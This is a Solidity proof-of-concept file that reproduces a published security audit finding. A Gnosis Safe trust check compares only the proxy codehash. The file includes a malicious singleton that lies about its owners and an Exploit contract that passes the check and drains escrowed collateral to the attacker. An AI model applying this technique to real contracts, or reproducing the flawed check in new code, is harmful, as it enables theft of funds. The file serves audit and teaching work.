// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Catalyst finding 36310 (C-01):
// "Withdrawing collateral and fees and bypassing trust safety mechanism".
//
// Real audited source (the vulnerable trust check is reproduced VERBATIM,
// the vulnerable line is marked @>):
//   protocol Catalyst (IPSeed)
//   contract IPSeedTrust
//   fn       checkIfBeneficiaryIsATrustedSafe
//   report   github.com/pashov/audits/blob/master/team/md/Catalyst-security-review-april.md
//
// Root cause: `checkIfBeneficiaryIsATrustedSafe` gates every collateral/fee
// withdrawal (claimCollateral / projectSucceeded) on the beneficiary being a
// genuine 2/2 Gnosis Safe co-owned by the protocolTrustee. But it only compares
// the beneficiary's PROXY codehash to `SAFE_PROXY_130_CODEHASH` (the @> line) and
// then trusts getThreshold()/getOwners()/isOwner() returned by that proxy. A
// Gnosis Safe proxy delegatecalls ALL logic to a singleton whose address lives in
// proxy storage slot 0, NOT in the proxy's code — so a GENUINE v1.3.0 proxy
// pointing at a MALICIOUS singleton has the exact same codehash as one pointing at
// the real singleton. The malicious singleton lies (threshold=2, owners=[trustee,
// attacker], isOwner(trustee)=true) so the check passes, yet the attacker alone
// controls the safe. The attacker withdraws the project's escrowed collateral with
// NO protocolTrustee approval.
//
// The vulnerable `checkIfBeneficiaryIsATrustedSafe` body is byte-for-byte the
// audited source. `GnosisSafeProxy` is the verbatim canonical v1.3.0 proxy so the
// codehash-collision is real (both proxies compile to identical runtime code ⇒
// identical codehash). Non-vulnerable dependencies (ERC20 collateral, the
// claimCollateral withdrawal wrapper, the honest reference singleton, and the
// malicious singleton described in the finding) are faithful minimal doubles; the
// malicious singleton uses immutable owner fields (baked in code) so its lies
// resolve correctly under delegatecall.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev The OwnerManager surface the trust check reads off the beneficiary safe.
interface IOwnerManager {
    function getThreshold() external view returns (uint256);
    function getOwners() external view returns (address[] memory);
    function isOwner(address owner) external view returns (bool);
}

/// @dev Faithful minimal ERC20 double for the escrowed collateral / fees.
contract MiniToken {
    string public name = "Catalyst Collateral";
    string public symbol = "cCOL";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VERBATIM canonical Gnosis Safe v1.3.0 proxy. The singleton is a CONSTRUCTOR arg
// stored in slot 0 (storage), so runtime code — and therefore codehash — is
// IDENTICAL for every instance regardless of which singleton it points at.
// ─────────────────────────────────────────────────────────────────────────────
contract GnosisSafeProxy {
    // singleton always needs to be first declared variable, to ensure that it is
    // at the same location in the contracts to which calls are delegated.
    address internal singleton;

    constructor(address _singleton) {
        require(_singleton != address(0), "Invalid singleton address provided");
        singleton = _singleton;
    }

    fallback() external payable {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            let _singleton := and(sload(0), 0xffffffffffffffffffffffffffffffffffffffff)
            // 0xa619486e == keccak("masterCopy()"). The value is right padded to 32-bytes with 0s
            if eq(calldataload(0), 0xa619486e00000000000000000000000000000000000000000000000000000000) {
                mstore(0, _singleton)
                return(0, 0x20)
            }
            calldatacopy(0, 0, calldatasize())
            let success := delegatecall(gas(), _singleton, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if eq(success, 0) { revert(0, returndatasize()) }
            return(0, returndatasize())
        }
    }
}

/// @dev Faithful honest Gnosis Safe singleton: a genuine 2/2 safe co-owned by the
///      protocolTrustee. Owners are immutable (code, not storage) so reads resolve
///      correctly when this is delegatecalled through a proxy. Used only as the
///      legitimate reference singleton to derive the genuine proxy codehash and to
///      show the honest safe passes the check for the right reasons.
contract LegitSafeSingleton {
    address internal singleton; // slot 0 reserved to mirror the proxy layout (unused)
    address public immutable sourcer;
    address public immutable trustee;

    constructor(address _sourcer, address _trustee) {
        sourcer = _sourcer;
        trustee = _trustee;
    }

    function getThreshold() external pure returns (uint256) {
        return 2;
    }

    function getOwners() external view returns (address[] memory a) {
        a = new address[](2);
        a[0] = sourcer;
        a[1] = trustee;
    }

    function isOwner(address o) external view returns (bool) {
        return o == sourcer || o == trustee;
    }
}

/// @dev Malicious Gnosis Safe singleton (the finding's `MaliciousGnosisSafe`). It
///      LIES so the trust check passes: threshold 2, owners = [trustee, attacker],
///      isOwner(trustee) = true — while the protocolTrustee never actually controls
///      the safe. Owner fields are immutable so the lies resolve under delegatecall.
///      `sweep` is the attacker's own fund-movement capability (a real Safe moves
///      funds by delegatecalling a module/singleton); executed in proxy context it
///      drains the proxy's collateral to the attacker.
contract MaliciousSafeSingleton {
    address internal singleton; // slot 0 reserved to mirror the proxy layout (unused)
    address public immutable fakeOwner; // reported as protocolTrustee (the lie)
    address public immutable realOwner; // the attacker, sole real controller

    constructor(address _fakeOwner, address _realOwner) {
        fakeOwner = _fakeOwner;
        realOwner = _realOwner;
    }

    function getThreshold() external pure returns (uint256) {
        return 2;
    }

    function getOwners() external view returns (address[] memory a) {
        a = new address[](2);
        a[0] = fakeOwner;
        a[1] = realOwner;
    }

    function isOwner(address owner) external view returns (bool) {
        // always vouch for the protocolTrustee, meeting the 2/2 requirement on paper
        if (owner == fakeOwner) return true;
        return owner == realOwner;
    }

    /// @notice Attacker capability: sweep collateral the safe received to `to`.
    ///         Delegatecalled via the proxy, `address(this)` is the proxy, so it
    ///         moves the proxy's own token balance.
    function sweep(MiniToken t, address to) external {
        t.transfer(to, t.balanceOf(address(this)));
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `checkIfBeneficiaryIsATrustedSafe` is reproduced VERBATIM
// from the audited IPSeedTrust source. `claimCollateral` is a faithful minimal
// double of the withdrawal path it gates.
// ─────────────────────────────────────────────────────────────────────────────
contract IPSeedTrust {
    error BeneficiaryIsNotTrustful();

    MiniToken public token;
    address public protocolTrustee;
    bytes32 public immutable SAFE_PROXY_130_CODEHASH;

    // Project escrow (faithful double): the beneficiary safe + its locked collateral/fees.
    address public projectBeneficiary;
    uint256 public collateral;

    constructor(MiniToken token_, address protocolTrustee_, bytes32 safeProxy130Codehash_) {
        token = token_;
        protocolTrustee = protocolTrustee_;
        SAFE_PROXY_130_CODEHASH = safeProxy130Codehash_;
    }

    /// @notice Faithful double: escrow a project's collateral/fees behind a beneficiary safe.
    function configureProject(address beneficiary_, uint256 collateral_) external {
        projectBeneficiary = beneficiary_;
        collateral = collateral_;
    }

    // ── VERBATIM audited source: the trust safety mechanism ──
    function checkIfBeneficiaryIsATrustedSafe(address beneficiary) public view {
        if (protocolTrustee == address(0)) {
            return; //when no trustee is configured, we're not checking for Safe accounts
        }
        IOwnerManager ownerManager = IOwnerManager(beneficiary);

        if (
            beneficiary.codehash != SAFE_PROXY_130_CODEHASH || ownerManager.getThreshold() != 2 // @> VULN: only compares the Safe PROXY codehash — never validates the singleton behind it — so a genuine proxy pointing at a malicious singleton passes
                || ownerManager.getOwners().length != 2 || !ownerManager.isOwner(protocolTrustee)
        ) {
            revert BeneficiaryIsNotTrustful();
        }
    }

    /// @notice Faithful double of the gated withdrawal (e.g. claimCollateral /
    ///         projectSucceeded): releases the escrowed collateral to the
    ///         beneficiary once the trust check passes.
    function claimCollateral() external {
        checkIfBeneficiaryIsATrustedSafe(projectBeneficiary);
        uint256 amount = collateral;
        collateral = 0;
        token.transfer(projectBeneficiary, amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: deploy a genuine v1.3.0 proxy over a MALICIOUS singleton (same
// codehash as the honest reference proxy), pass the trust check with no real
// protocolTrustee approval, and drain the project's escrowed collateral.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniToken public token;
    LegitSafeSingleton public legitSingleton;
    GnosisSafeProxy public refProxy; // honest reference safe (derives the genuine codehash)
    IPSeedTrust public vuln; // VULN
    MaliciousSafeSingleton public malSingleton;
    GnosisSafeProxy public beneficiary; // attacker's malicious safe

    address internal constant PROTOCOL_TRUSTEE = address(0x7EEE); // high-trust molecule wallet
    address internal constant SOURCER = address(0x50C5); // project sourcer
    uint256 internal constant COLLATERAL = 100e18; // escrowed collateral + fees

    uint256 public trusteeApprovals; // proof: the protocolTrustee never signed anything
    uint256 public profit; // collateral drained to the attacker

    constructor() {
        token = new MiniToken(); // child nonce 1  (collateral / profit token)
        legitSingleton = new LegitSafeSingleton(SOURCER, PROTOCOL_TRUSTEE); // child nonce 2
        refProxy = new GnosisSafeProxy(address(legitSingleton)); // child nonce 3 (honest reference)
        vuln = new IPSeedTrust(token, PROTOCOL_TRUSTEE, address(refProxy).codehash); // child nonce 4 (VULN)
        malSingleton = new MaliciousSafeSingleton(PROTOCOL_TRUSTEE, address(this)); // child nonce 5
        beneficiary = new GnosisSafeProxy(address(malSingleton)); // child nonce 6 (attacker safe)

        // protocol escrows the project's collateral behind the (malicious) beneficiary safe
        token.mint(address(vuln), COLLATERAL);
        vuln.configureProject(address(beneficiary), COLLATERAL);
    }

    function run() external {
        // The malicious proxy is byte-for-byte identical to the honest one — the
        // codehash-only check cannot tell them apart.
        require(
            address(beneficiary).codehash == address(refProxy).codehash
                && address(beneficiary).codehash == vuln.SAFE_PROXY_130_CODEHASH(),
            "codehash mismatch"
        );

        // Honest safe passes the check for the right reasons (protocolTrustee is a real 2/2 owner).
        vuln.checkIfBeneficiaryIsATrustedSafe(address(refProxy));

        // Malicious safe ALSO passes — despite the protocolTrustee having no real control.
        vuln.checkIfBeneficiaryIsATrustedSafe(address(beneficiary));

        uint256 escrowBefore = token.balanceOf(address(vuln));

        // Withdraw the escrowed collateral to the attacker-controlled safe, with NO
        // protocolTrustee approval (trusteeApprovals stays 0).
        vuln.claimCollateral();

        // Attacker (sole controller of the malicious safe) sweeps the drained funds to itself.
        MaliciousSafeSingleton(address(beneficiary)).sweep(token, address(this));

        profit = token.balanceOf(address(this));

        // harm: drained the full project escrow bypassing the 2/2 trust gate, with no trustee signature
        require(trusteeApprovals == 0, "trustee somehow approved");
        require(escrowBefore == COLLATERAL, "escrow not funded");
        require(token.balanceOf(address(vuln)) == 0, "escrow not drained");
        require(profit == COLLATERAL, "attacker did not receive the collateral");
    }
}
